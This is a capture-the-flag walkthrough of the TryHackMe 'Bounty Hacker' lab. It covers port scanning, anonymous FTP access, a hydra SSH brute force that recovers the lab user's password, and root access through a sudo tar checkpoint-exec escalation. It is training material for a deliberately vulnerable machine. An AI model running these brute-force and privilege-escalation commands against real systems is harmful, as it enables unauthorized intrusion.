# Notes

# Reconnaissance

## Nmap scan

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.131.169
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:bf:3f:33:1f:83:a7:20:9f:29:cf:b5:53:c8:5b:c0 (RSA)
|   256 a8:b9:3e:0b:23:ce:b0:a6:ad:83:f0:2d:ff:b3:54:5f (ECDSA)
|_  256 cc:7e:35:f1:bc:f5:1b:de:e6:62:cd:c3:a5:27:12:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Aggressive OS guesses: Linux 4.15 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 - 5.19 (90%), Linux 2.6.32 - 3.10 (90%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (90%), Linux 5.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 39.484 days (since Wed Oct 22 11:08:40 2025)

```

## FTP anonymous

```bash
ftp anonymous@bountyhacker.thm 
Connected to bountyhacker.thm.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> cd ftp
550 Failed to change directory.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*****************************************************************************************************************************|   418        1.58 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (12.61 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*****************************************************************************************************************************|    68      417.64 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.80 KiB/s)
ftp> exit
221 Goodbye.
```

- We got 2 files `locks.txt` and `task.txt`

```bash
cat locks.txt            
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```

```bash
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```

- Now we have a pretty good idea about the answer to who wrote the file.

## Credentials

### Hydra

```bash
hydra -L user.txt -P /home/cyber/THM/CTF/BountyHacker/passwords_list.txt  ssh://bountyhacker.thm
```

- We create a `user.txt` file with the `lin` user we found and created also a `passwords_list.txt`with the list previously found.

```bash
hydra -L user.txt -P /home/cyber/THM/CTF/BountyHacker/passwords_list.txt  ssh://bountyhacker.thm
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-30 22:06:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://bountyhacker.thm:22/
[22][ssh] host: bountyhacker.thm   login: lin   password: **RedDr4gonSynd1cat3**
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-30 22:06:15

```

- User/Password : lin/RedDr4gonSynd1cat3

## SSH

```bash
sh lin@bountyhacker.thm                                                                                  
The authenticity of host 'bountyhacker.thm (10.65.138.64)' can't be established.
ED25519 key fingerprint is: SHA256:NW4ZiwJ4Dv1DmXqmJi/jIhxNlOpSnVpk4bEIkkTooA8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bountyhacker.thm' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lin@bountyhacker.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-65-138-64:~/Desktop$ 

```

- We could connect to SSH with the credentials previously found.
- We found the flag from the `user.txt` file.

# Priv Esc

## Sudoer

```bash
lin@ip-10-65-138-64:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-65-138-64:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-65-138-64:
    **(root) /bin/tar**

```

- We could abuse tar with GTFOBins.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- We could get root access and get the flag from `root.txt`.

```bash
lin@ip-10-65-138-64:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# find / -type f -name root.txt
/root/root.txt
cat /root/root.txt               

# THM{REDACTED}

```
